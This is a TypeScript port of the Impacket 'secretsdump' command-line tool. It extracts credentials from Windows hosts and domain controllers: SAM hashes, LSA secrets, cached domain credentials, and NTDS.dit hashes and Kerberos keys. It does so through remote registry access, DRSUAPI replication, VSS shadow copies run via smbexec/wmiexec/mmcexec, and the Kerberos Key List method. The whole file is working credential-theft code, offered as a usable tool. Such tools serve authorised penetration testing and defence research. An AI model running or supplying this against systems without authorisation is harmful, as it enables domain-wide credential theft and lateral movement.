#!/usr/bin/env node
// Impacket - Collection of Python classes for working with network protocols.
//
// Copyright Fortra, LLC and its affiliated companies
//
// All rights reserved.
//
// This software is provided under a slightly modified version
// of the Apache Software License. See the accompanying LICENSE file
// for more information.
//
// Description:
//   Performs various techniques to dump hashes from the
//   remote machine without executing any agent there.
//   For SAM and LSA Secrets (including cached creds)
//   we try to read as much as we can from the registry
//   and then we save the hives in the target system
//   (%SYSTEMROOT%\Temp dir) and read the rest of the
//   data from there.
//   For NTDS.dit we either:
//       a. Get the domain users list and get its hashes
//          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
//          call, replicating just the attributes we need.
//       b. Extract NTDS.dit via vssadmin executed with the
//          smbexec approach.
//          It's copied on the temp dir and parsed remotely.
//
//   The script initiates the services required for its working
//   if they are not available (e.g. Remote Registry, even if it is
//   disabled). After the work is done, things are restored to the
//   original state.
//
// Author:
//   Alberto Solino (@agsolino)
//
// TypeScript port:
//   impacket-js contributors

import { unlinkSync } from 'node:fs';
import { createInterface } from 'node:readline';
import { parseArgs } from 'node:util';
import {
  parseTarget,
  init as initLogger,
  initProxy,
  info,
  error as logError,
  debug as logDebug,
  warning,
  LogLevel,
  getLevel,
  RemoteOperations,
  SAMHashes,
  LSASecrets,
  NTDSHashes,
  KeyListSecrets,
  LocalOperations,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';
import { SMBConnection } from '@impacket/smb-connection';
import { LDAPConnection, LDAPSessionError } from '@impacket/ldap';
import { Keytab as KeytabModule } from '@impacket/krb5';

// ---------------------------------------------------------------------------
// CLI option definitions
// ---------------------------------------------------------------------------

interface SecretsDumpOptions {
  target: string;
  ts: boolean;
  debug: boolean;
  system?: string;
  bootkey?: string;
  security?: string;
  sam?: string;
  ntds?: string;
  resumefile?: string;
  skipSam: boolean;
  skipSecurity: boolean;
  outputfile?: string;
  useVss: boolean;
  rodcNo?: number;
  rodcKey?: string;
  useKeylist: boolean;
  execMethod: 'smbexec' | 'wmiexec' | 'mmcexec';
  useRemoteSSWMI: boolean;
  useRemoteSSWMI_NTDS: boolean;
  remoteSSWMIRemoteVolume: string;
  remoteSSWMILocalPath: string;
  justDcUser?: string;
  ldapfilter?: string;
  justDc: boolean;
  justDcNtlm: boolean;
  skipUser?: string;
  pwdLastSet: boolean;
  userStatus: boolean;
  history: boolean;
  trustKeys: boolean;
  justTrustKeys: boolean;
  hashes?: string;
  noPass: boolean;
  k: boolean;
  aesKey?: string;
  keytab?: string;
  dcIp?: string;
  targetIp?: string;
}

function printUsage(): void {
  console.log(`usage: secretsdump [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY]
                   [-security SECURITY] [-sam SAM] [-ntds NTDS]
                   [-resumefile RESUMEFILE] [-skip-sam] [-skip-security]
                   [-outputfile OUTPUTFILE] [-use-vss]
                   [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist]
                   [-exec-method {smbexec,wmiexec,mmcexec}]
                   [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER]
                   [-just-dc] [-just-dc-ntlm] [-trust-keys] [-just-trust-keys]
                   [-skip-user USER] [-pwd-last-set] [-user-status] [-history]
                   [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                   [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                   target

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
                        or LOCAL (if parsing local files)

options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -system SYSTEM        SYSTEM hive to parse
  -bootkey BOOTKEY      bootkey for SYSTEM hive
  -security SECURITY    SECURITY hive to parse
  -sam SAM              SAM hive to parse
  -ntds NTDS            NTDS.DIT file to parse
  -resumefile RESUMEFILE
                        resume file for NTDS.DIT session dump (only available
                        for DRSUAPI approach)
  -skip-sam             Do NOT parse the SAM hive on remote system
  -skip-security        Do NOT parse the SECURITY hive on remote system
  -outputfile OUTPUTFILE
                        base output filename. Extensions will be added for
                        sam, secrets, cached and ntds
  -use-vss              Use the VSS method (NTDSUTIL) instead of default
                        DRSUAPI
  -rodcNo RODCNO        Number of the RODC krbtgt account (for the
                        Kerb-Key-List approach)
  -rodcKey RODCKEY      AES key of the Read Only Domain Controller
  -use-keylist          Use the Kerb-Key-List method instead of DRSUAPI
  -exec-method {smbexec,wmiexec,mmcexec}
                        Remote exec method to use at target (only when using
                        -use-vss). Default: smbexec
  -use-remoteSSWMI      Remotely create Shadow Snapshot via WMI and download
                        SAM/SYSTEM/SECURITY
  -use-remoteSSWMI-NTDS
                        Dump NTDS.DIT when using Remote Shadow Snapshot
                        (requires -use-remoteSSWMI)
  -remoteSSWMI-remote-volume VOLUME
                        Remote volume for Shadow Snapshot (default C:\\)
  -remoteSSWMI-local-path PATH
                        Local path for downloaded files (default .)

display options:
  -just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified.
                        Only available for DRSUAPI approach. Implies also
                        -just-dc switch
  -ldapfilter LDAPFILTER
                        Extract only NTDS.DIT data for users matching LDAP
                        filter
  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos
                        keys)
  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
  -trust-keys           Dump TDO secrets and derive inter-realm Kerberos keys
  -just-trust-keys      Dump only trust keys, skip account secrets
  -skip-user USER       Do NOT extract NTDS.DIT data for user(s) (comma-
                        separated or file)
  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account
  -user-status          Display whether or not the user is disabled
  -history              Dump password history, and target LSA Secrets OldVal

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will
                        use whatever was specified as target
`);
}

function parseCliArgs(argv: string[]): SecretsDumpOptions {
  // Separate positional arguments from flags.
  // parseArgs from node:util requires explicit option definitions.
  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args: argv,
      allowPositionals: true,
      options: {
        help:                       { type: 'boolean', short: 'h', default: false },
        ts:                         { type: 'boolean', default: false },
        debug:                      { type: 'boolean', default: false },
        system:                     { type: 'string' },
        bootkey:                    { type: 'string' },
        security:                   { type: 'string' },
        sam:                        { type: 'string' },
        ntds:                       { type: 'string' },
        resumefile:                 { type: 'string' },
        'skip-sam':                 { type: 'boolean', default: false },
        'skip-security':            { type: 'boolean', default: false },
        outputfile:                 { type: 'string' },
        'use-vss':                  { type: 'boolean', default: false },
        rodcNo:                     { type: 'string' },
        rodcKey:                    { type: 'string' },
        'use-keylist':              { type: 'boolean', default: false },
        'exec-method':              { type: 'string', default: 'smbexec' },
        'use-remoteSSWMI':          { type: 'boolean', default: false },
        'use-remoteSSWMI-NTDS':     { type: 'boolean', default: false },
        'remoteSSWMI-remote-volume':{ type: 'string', default: 'C:\\' },
        'remoteSSWMI-local-path':   { type: 'string', default: '.' },
        'just-dc-user':             { type: 'string' },
        ldapfilter:                 { type: 'string' },
        'just-dc':                  { type: 'boolean', default: false },
        'just-dc-ntlm':             { type: 'boolean', default: false },
        'trust-keys':               { type: 'boolean', default: false },
        'just-trust-keys':          { type: 'boolean', default: false },
        'skip-user':                { type: 'string' },
        'pwd-last-set':             { type: 'boolean', default: false },
        'user-status':              { type: 'boolean', default: false },
        history:                    { type: 'boolean', default: false },
        hashes:                     { type: 'string' },
        'no-pass':                  { type: 'boolean', default: false },
        k:                          { type: 'boolean', default: false },
        aesKey:                     { type: 'string' },
        keytab:                     { type: 'string' },
        'dc-ip':                    { type: 'string' },
        'target-ip':                { type: 'string' },
        proxy:                      { type: 'string' },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    printUsage();
    process.exit(1);
  }

  if (values.help || positionals.length === 0) {
    printUsage();
    process.exit(positionals.length === 0 ? 1 : 0);
  }

  const execMethod = (values['exec-method'] as string) ?? 'smbexec';
  if (!['smbexec', 'wmiexec', 'mmcexec'].includes(execMethod)) {
    logError(`Invalid exec-method: ${execMethod}. Must be smbexec, wmiexec, or mmcexec`);
    process.exit(1);
  }

  const rodcNoStr = values.rodcNo as string | undefined;
  const rodcNo = rodcNoStr !== undefined ? parseInt(rodcNoStr, 10) : undefined;
  if (rodcNoStr !== undefined && isNaN(rodcNo!)) {
    logError('-rodcNo must be a number');
    process.exit(1);
  }

  initProxy(values.proxy);

  return {
    target:                   positionals[0]!,
    ts:                       values.ts as boolean,
    debug:                    values.debug as boolean,
    system:                   values.system as string | undefined,
    bootkey:                  values.bootkey as string | undefined,
    security:                 values.security as string | undefined,
    sam:                      values.sam as string | undefined,
    ntds:                     values.ntds as string | undefined,
    resumefile:               values.resumefile as string | undefined,
    skipSam:                  values['skip-sam'] as boolean,
    skipSecurity:             values['skip-security'] as boolean,
    outputfile:               values.outputfile as string | undefined,
    useVss:                   values['use-vss'] as boolean,
    rodcNo,
    rodcKey:                  values.rodcKey as string | undefined,
    useKeylist:               values['use-keylist'] as boolean,
    execMethod:               execMethod as 'smbexec' | 'wmiexec' | 'mmcexec',
    useRemoteSSWMI:           values['use-remoteSSWMI'] as boolean,
    useRemoteSSWMI_NTDS:      values['use-remoteSSWMI-NTDS'] as boolean,
    remoteSSWMIRemoteVolume:  (values['remoteSSWMI-remote-volume'] as string) ?? 'C:\\',
    remoteSSWMILocalPath:     (values['remoteSSWMI-local-path'] as string) ?? '.',
    justDcUser:               values['just-dc-user'] as string | undefined,
    ldapfilter:               values.ldapfilter as string | undefined,
    justDc:                   values['just-dc'] as boolean,
    justDcNtlm:               values['just-dc-ntlm'] as boolean,
    skipUser:                 values['skip-user'] as string | undefined,
    pwdLastSet:               values['pwd-last-set'] as boolean,
    userStatus:               values['user-status'] as boolean,
    history:                  values.history as boolean,
    trustKeys:                values['trust-keys'] as boolean,
    justTrustKeys:            values['just-trust-keys'] as boolean,
    hashes:                   values.hashes as string | undefined,
    noPass:                   values['no-pass'] as boolean,
    k:                        values.k as boolean,
    aesKey:                   values.aesKey as string | undefined,
    keytab:                   values.keytab as string | undefined,
    dcIp:                     values['dc-ip'] as string | undefined,
    targetIp:                 values['target-ip'] as string | undefined,
  };
}

// ---------------------------------------------------------------------------
// DumpSecrets class
// ---------------------------------------------------------------------------

class DumpSecrets {
  private useVSSMethod: boolean;
  private useKeyListMethod: boolean;
  private remoteName: string;
  private remoteHost: string | undefined;
  private username: string;
  private password: string;
  private domain: string;
  private lmhash = '';
  private nthash = '';
  private aesKey: string | undefined;
  private aesKeyRodc: string | undefined;
  private smbConnection: InstanceType<typeof SMBConnection> | null = null;
  private ldapConnection: InstanceType<typeof LDAPConnection> | null = null;
  private remoteOps: RemoteOperations | null = null;
  private samHashes: SAMHashes | null = null;
  private ntdsHashes: NTDSHashes | null = null;
  private lsaSecrets: LSASecrets | null = null;
  private keyListSecrets: KeyListSecrets | null = null;
  private rodc: number | undefined;
  private systemHive: string | undefined;
  private bootkeyHex: string | undefined;
  private securityHive: string | undefined;
  private samHive: string | undefined;
  private ntdsFile: string | undefined;
  private skipSam: boolean;
  private skipSecurity: boolean;
  private historyFlag: boolean;
  private noLMHash = true;
  private isRemote = true;
  private outputFileName: string | undefined;
  private doKerberos: boolean;
  private justDC: boolean;
  private justDCNTLM: boolean;
  private justUser: string | undefined;
  private ldapFilter: string | undefined;
  private skipUser: string | undefined;
  private pwdLastSet: boolean;
  private printUserStatus: boolean;
  private resumeFileName: string | undefined;
  private canProcessSAMLSA = true;
  private kdcHost: string | undefined;
  private remoteSSWMI: boolean;
  private remoteSSWMINTDS: boolean;
  private remoteSSMethodWMIRemoteVolume: string;
  private remoteSSMethodWMIDownloadPath: string;
  private execMethod: string;
  private baseDN = '';
  private target = '';

  constructor(
    remoteName: string,
    username: string,
    password: string,
    domain: string,
    options: SecretsDumpOptions,
  ) {
    this.useVSSMethod = options.useVss;
    this.useKeyListMethod = options.useKeylist;
    this.remoteName = remoteName;
    this.remoteHost = options.targetIp;
    this.username = username;
    this.password = password;
    this.domain = domain;
    this.aesKey = options.aesKey;
    this.aesKeyRodc = options.rodcKey;
    this.rodc = options.rodcNo;
    this.systemHive = options.system;
    this.bootkeyHex = options.bootkey;
    this.securityHive = options.security;
    this.samHive = options.sam;
    this.ntdsFile = options.ntds;
    this.skipSam = options.skipSam;
    this.skipSecurity = options.skipSecurity;
    this.historyFlag = options.history;
    this.outputFileName = options.outputfile;
    this.doKerberos = options.k;
    this.justDC = options.justDc;
    this.justDCNTLM = options.justDcNtlm;
    this.justUser = options.justDcUser;
    this.ldapFilter = options.ldapfilter;
    this.skipUser = options.skipUser;
    this.pwdLastSet = options.pwdLastSet;
    this.printUserStatus = options.userStatus;
    this.resumeFileName = options.resumefile;
    this.kdcHost = options.dcIp;
    this.remoteSSWMI = options.useRemoteSSWMI;
    this.remoteSSWMINTDS = options.useRemoteSSWMI_NTDS;
    this.remoteSSMethodWMIRemoteVolume = options.remoteSSWMIRemoteVolume;
    this.remoteSSMethodWMIDownloadPath = options.remoteSSWMILocalPath;
    this.execMethod = options.execMethod;

    if (options.hashes != null) {
      const parts = options.hashes.split(':');
      this.lmhash = parts[0] ?? '';
      this.nthash = parts[1] ?? '';
    }
  }

  async connect(): Promise<void> {
    this.smbConnection = new SMBConnection(this.remoteName, this.remoteHost ?? this.remoteName);
    await this.smbConnection.negotiateSession();
    if (this.doKerberos) {
      await this.smbConnection.kerberosLogin(
        this.username,
        this.password,
        this.domain,
        this.lmhash,
        this.nthash,
        this.aesKey ?? '',
        this.kdcHost ?? null,
      );
    } else {
      await this.smbConnection.login(
        this.username,
        this.password,
        this.domain,
        this.lmhash,
        this.nthash,
      );
    }
  }

  async ldapConnect(): Promise<void> {
    if (this.doKerberos) {
      this.target = this.remoteHost ?? this.remoteName;
    } else {
      if (this.kdcHost != null) {
        this.target = this.kdcHost;
      } else {
        this.target = this.domain;
      }
    }

    // Create the baseDN
    let domainParts: string[];
    if (this.domain) {
      domainParts = this.domain.split('.');
    } else {
      const domainStr = this.target.split('.').slice(1).join('.');
      domainParts = domainStr ? domainStr.split('.') : [this.target];
    }
    this.baseDN = domainParts.map((p) => `dc=${p}`).join(',');

    try {
      this.ldapConnection = new LDAPConnection({
        url: `ldap://${this.target}`,
        baseDN: this.baseDN,
        dstIp: this.kdcHost,
      });
      if (!this.doKerberos) {
        await this.ldapConnection.login({
          user: this.username,
          password: this.password,
          domain: this.domain,
          lmhash: this.lmhash,
          nthash: this.nthash,
        });
      } else {
        await this.ldapConnection.kerberosLogin({
          user: this.username,
          password: this.password,
          domain: this.domain,
          lmhash: this.lmhash,
          nthash: this.nthash,
          aesKey: this.aesKey,
          kdcHost: this.kdcHost,
        });
      }
    } catch (e: any) {
      if (e instanceof LDAPSessionError && String(e).includes('strongerAuthRequired')) {
        // We need to try SSL
        this.ldapConnection = new LDAPConnection({
          url: `ldaps://${this.target}`,
          baseDN: this.baseDN,
          dstIp: this.kdcHost,
        });
        if (!this.doKerberos) {
          await this.ldapConnection.login({
            user: this.username,
            password: this.password,
            domain: this.domain,
            lmhash: this.lmhash,
            nthash: this.nthash,
          });
        } else {
          await this.ldapConnection.kerberosLogin({
            user: this.username,
            password: this.password,
            domain: this.domain,
            lmhash: this.lmhash,
            nthash: this.nthash,
            aesKey: this.aesKey,
            kdcHost: this.kdcHost,
          });
        }
      } else {
        throw e;
      }
    }
  }

  async dump(): Promise<void> {
    try {
      let localDomainSid: string | null = null;
      let bootKey: Buffer | null = null;

      // Remote Shadow Snapshot via WMI mode
      if (this.remoteSSWMI) {
        this.isRemote = false;
        this.useVSSMethod = true;
        try {
          await this.connect();
        } catch (e: any) {
          if (process.env['KRB5CCNAME'] != null && this.doKerberos) {
            logDebug(`SMBConnection didn't work, hoping Kerberos will help (${String(e)})`);
          } else {
            throw e;
          }
        }

        this.remoteOps = new RemoteOperations(
          this.smbConnection,
          this.doKerberos,
          this.kdcHost,
          this.ldapConnection,
        );
        this.remoteOps.setExecMethod(this.execMethod);
        const downloadResult = await (this.remoteOps as any).createSSandDownloadWMI(
          this.remoteSSMethodWMIRemoteVolume,
          this.remoteSSMethodWMIDownloadPath,
          this.remoteSSWMINTDS,
        );
        const [samPath, systemPath, securityPath, ...ntdsPath] = downloadResult;
        this.samHive = samPath;
        this.systemHive = systemPath;
        this.securityHive = securityPath;
        this.ntdsFile = ntdsPath[0] ?? undefined;

        const localOperations = new LocalOperations(this.systemHive!);
        bootKey = localOperations.getBootKey();
        if (this.ntdsFile != null) {
          this.noLMHash = localOperations.checkNoLMHashPolicy();
        }
      } else if (this.remoteName.toUpperCase() === 'LOCAL' && this.username === '') {
        // Local mode
        this.isRemote = false;
        this.useVSSMethod = true;

        if (this.systemHive) {
          const localOperations = new LocalOperations(this.systemHive);
          bootKey = localOperations.getBootKey();
          if (this.ntdsFile != null) {
            this.noLMHash = localOperations.checkNoLMHashPolicy();
          }
        } else {
          bootKey = Buffer.from(this.bootkeyHex!, 'hex');
        }
      } else {
        // Remote mode
        this.isRemote = true;
        bootKey = null;

        if (this.ldapFilter != null) {
          info(`Querying ${this.domain} for information about domain users via LDAP`);
          try {
            await this.ldapConnect();
          } catch (e: any) {
            logError(`LDAP connection failed: ${String(e)}`);
          }
        }

        try {
          try {
            await this.connect();
          } catch (e: any) {
            if (process.env['KRB5CCNAME'] != null && this.doKerberos) {
              logDebug(`SMBConnection didn't work, hoping Kerberos will help (${String(e)})`);
            } else {
              throw e;
            }
          }

          this.remoteOps = new RemoteOperations(
            this.smbConnection,
            this.doKerberos,
            this.kdcHost,
            this.ldapConnection,
          );
          this.remoteOps.setExecMethod(this.execMethod);

          if (
            (!this.justDC && !this.justDCNTLM && !this.useKeyListMethod) ||
            this.useVSSMethod
          ) {
            await this.remoteOps.enableRegistry();
            bootKey = await this.remoteOps.getBootKey();
            this.noLMHash = await this.remoteOps.checkNoLMHashPolicy();
          }
        } catch (e: any) {
          this.canProcessSAMLSA = false;
          if (
            String(e).includes('STATUS_USER_SESSION_DELETED') &&
            process.env['KRB5CCNAME'] != null &&
            this.doKerberos
          ) {
            logError(
              'Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user',
            );
          } else {
            logError(`RemoteOperations failed: ${String(e)}`);
          }
        }
      }

      // If the KerberosKeyList method is enabled, dump secrets only via TGS-REQ
      if (this.useKeyListMethod) {
        try {
          this.keyListSecrets = new KeyListSecrets(
            this.domain,
            this.remoteName,
            this.rodc!,
            this.aesKeyRodc!,
            this.remoteOps,
          );
          await this.keyListSecrets.dump();
        } catch (e: any) {
          logError(`Something went wrong with the Kerberos Key List approach.: ${String(e)}`);
        }
      } else {
        // If RemoteOperations succeeded, then we can extract SAM and LSA
        if (!this.justDC && !this.justDCNTLM && this.canProcessSAMLSA) {
          if (!this.skipSam) {
            try {
              let samFileName: any;
              if (this.isRemote) {
                samFileName = await this.remoteOps!.saveSAM();
              } else {
                samFileName = this.samHive!;
              }
              this.samHashes = new SAMHashes(samFileName, bootKey!, this.isRemote, this.printUserStatus);
              await this.samHashes.dump();
              if (this.outputFileName != null) {
                this.samHashes.export(this.outputFileName);
              }
            } catch (e: any) {
              logError(`SAM hashes extraction failed: ${String(e)}`);
            }
          }

          if (!this.skipSecurity) {
            try {
              let securityFileName: any;
              if (this.isRemote) {
                securityFileName = await this.remoteOps!.saveSECURITY();
              } else {
                securityFileName = this.securityHive!;
              }

              this.lsaSecrets = new LSASecrets(securityFileName, bootKey!, this.remoteOps, this.isRemote, this.historyFlag);
              await this.lsaSecrets.dumpCachedHashes();
              if (this.outputFileName != null) {
                this.lsaSecrets.exportCached(this.outputFileName);
              }
              await this.lsaSecrets.dumpSecrets();
              if (this.outputFileName != null) {
                this.lsaSecrets.exportSecrets(this.outputFileName);
              }
            } catch (e: any) {
              if (getLevel() === LogLevel.DEBUG) {
                console.error(e);
              }
              logError(`LSA hashes extraction failed: ${String(e)}`);
            }
          }
        }

        // NTDS extraction - can try regardless of RemoteOperations failing
        let ntdsFileName: any = null;
        if (this.isRemote) {
          if (this.useVSSMethod && this.remoteOps != null && this.remoteOps.getRRP() != null) {
            ntdsFileName = await this.remoteOps.saveNTDS();
          }
        } else {
          ntdsFileName = this.ntdsFile ?? null;
        }

        if (ntdsFileName != null) {
          try {
            if (this.isRemote) {
              localDomainSid = this.remoteOps!.getDomainSid();
            } else {
              localDomainSid = (NTDSHashes as any).getLocalDomainSid(ntdsFileName);
            }
          } catch (e: any) {
            logDebug(`Failed to resolve local domain SID: ${String(e)}`);
          }
        }

        this.ntdsHashes = new NTDSHashes({
          ntdsFile: ntdsFileName,
          bootKey: bootKey ?? Buffer.alloc(0),
          isRemote: this.isRemote,
          history: this.historyFlag,
          noLMHash: this.noLMHash,
          remoteOps: this.remoteOps,
          useVSSMethod: this.useVSSMethod,
          remoteSSMethodWMINTDS: this.remoteSSWMINTDS,
          justNTLM: this.justDCNTLM,
          pwdLastSet: this.pwdLastSet,
          resumeSession: this.resumeFileName,
          outputFileName: this.outputFileName,
          justUser: this.justUser,
          skipUser: this.skipUser,
          ldapFilter: this.ldapFilter,
          printUserStatus: this.printUserStatus,
        });

        try {
          await this.ntdsHashes.dump();
        } catch (e: any) {
          if (getLevel() === LogLevel.DEBUG) {
            console.error(e);
          }
          if (String(e).includes('ERROR_DS_DRA_BAD_DN')) {
            // Don't store the resume file if this error happened -- lack of privileges for DRSUAPI
            const resumeFile = this.ntdsHashes.getResumeSessionFile();
            if (resumeFile != null) {
              try {
                unlinkSync(resumeFile);
              } catch {
                // ignore
              }
            }
          }
          logError(String(e));
          if (
            (this.justUser || this.ldapFilter) &&
            String(e).includes('ERROR_DS_NAME_ERROR_NOT_UNIQUE')
          ) {
            info(
              'You just got that error because there might be some duplicates of the same name. ' +
                'Try specifying the domain name for the user as well. It is important to specify it ' +
                'in the form of NetBIOS domain name/user (e.g. contoso/Administrator).',
            );
          } else if (!this.useVSSMethod) {
            info('Something went wrong with the DRSUAPI approach. Try again with --use-vss parameter');
          }
        }
        await this.cleanup();
      }
    } catch (e: any) {
      if (getLevel() === LogLevel.DEBUG) {
        console.error(e);
      }
      logError(String(e));

      if (this.ntdsHashes != null) {
        // On interrupt, ask about resume file deletion
        if (e.code === 'ERR_USE_AFTER_CLOSE' || e.message?.includes('interrupted')) {
          const answer = await askQuestion('Delete resume session file? [y/N] ');
          if (answer.toUpperCase() === 'Y') {
            const resumeFile = this.ntdsHashes.getResumeSessionFile();
            if (resumeFile != null) {
              try {
                unlinkSync(resumeFile);
              } catch {
                // ignore
              }
            }
          }
        }
      }

      try {
        await this.cleanup();
      } catch {
        // ignore cleanup errors
      }
    }
  }

  async cleanup(): Promise<void> {
    info('Cleaning up... ');
    if (this.remoteOps) {
      await this.remoteOps.finish();
    }
    if (this.samHashes) {
      this.samHashes.finish();
    }
    if (this.lsaSecrets) {
      this.lsaSecrets.finish();
    }
    if (this.ntdsHashes) {
      this.ntdsHashes.finish();
    }
    if (this.keyListSecrets) {
      // KeyListSecrets has no finish() method; no cleanup needed
    }
    if (this.smbConnection) {
      try {
        await this.smbConnection.close();
      } catch {
        // ignore
      }
    }
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function askQuestion(prompt: string): Promise<string> {
  const rl = createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    rl.question(prompt, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------

async function main(): Promise<void> {
  console.log(BANNER + '\n');

  const options = parseCliArgs(normalizeArgs(process.argv.slice(2)));

  // Initialize logger
  initLogger({ ts: options.ts, debug: options.debug });

  // Parse the target string
  let [domain, username, password, remoteName] = parseTarget(options.target);

  // Validate option combinations
  if (options.justDcUser != null || options.ldapfilter != null) {
    if (options.useVss || options.useRemoteSSWMI_NTDS) {
      logError('--just-dc-user switch is not supported in VSS mode nor WMI VSS mode');
      process.exit(1);
    } else if (options.resumefile != null) {
      logError('Resuming a previous NTDS.DIT dump session not compatible with --just-dc-user switch');
      process.exit(1);
    } else if (remoteName.toUpperCase() === 'LOCAL' && username === '') {
      logError('--just-dc-user not compatible in LOCAL mode');
      process.exit(1);
    } else {
      // Having this switch on implies not asking for anything else.
      options.justDc = true;
    }
  }

  if ((options.useVss || options.useRemoteSSWMI_NTDS) && options.resumefile != null) {
    logError('Resuming a previous NTDS.DIT dump session is not supported in VSS mode nor WMI VSS mode');
    process.exit(1);
  }

  if (options.useRemoteSSWMI_NTDS && !options.useRemoteSSWMI) {
    logError('--use-remotesswmi-ntds requires --use-remotesswmi to be specified');
    process.exit(1);
  }

  if (options.useKeylist && (options.rodcNo == null || options.rodcKey == null)) {
    logError('Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach');
    process.exit(1);
  }

  if (remoteName.toUpperCase() === 'LOCAL' && username === '' && options.resumefile != null) {
    logError('Resuming a previous NTDS.DIT dump session is not supported in LOCAL mode');
    process.exit(1);
  }

  if (remoteName.toUpperCase() === 'LOCAL' && username === '') {
    if (options.system == null && options.bootkey == null) {
      logError('Either the SYSTEM hive or bootkey is required for local parsing, check --help');
      process.exit(1);
    }
  } else {
    if (options.targetIp == null) {
      options.targetIp = remoteName;
    }

    if (!domain) {
      domain = '';
    }

    if (options.keytab != null) {
      // Load keys from keytab file
      const keytab = KeytabModule.Keytab.loadFile(options.keytab);
      // Set aesKey from keytab if available
      const spn = `${username}@${domain}`;
      const key = keytab.getKey(spn);
      if (key != null) {
        options.aesKey = key.keyvalue.data.toString('hex');
      }
      options.k = true;
    }

    if (
      password === '' &&
      username !== '' &&
      options.hashes == null &&
      !options.noPass &&
      options.aesKey == null
    ) {
      password = await askQuestion('Password: ');
    }

    if (options.aesKey != null) {
      options.k = true;
    }
  }

  // Handle trust-keys flags (not yet implemented)
  if (options.justTrustKeys) {
    warning('Trust key dumping is not yet implemented');
    process.exit(1);
  }
  if (options.trustKeys) {
    warning('Trust key dumping is not yet implemented');
  }

  const dumper = new DumpSecrets(remoteName, username, password, domain, options);
  try {
    await dumper.dump();
  } catch (e: any) {
    if (getLevel() === LogLevel.DEBUG) {
      console.error(e);
    }
    logError(String(e));
  }
}

main().catch((e) => {
  logError(String(e));
  process.exit(1);
});
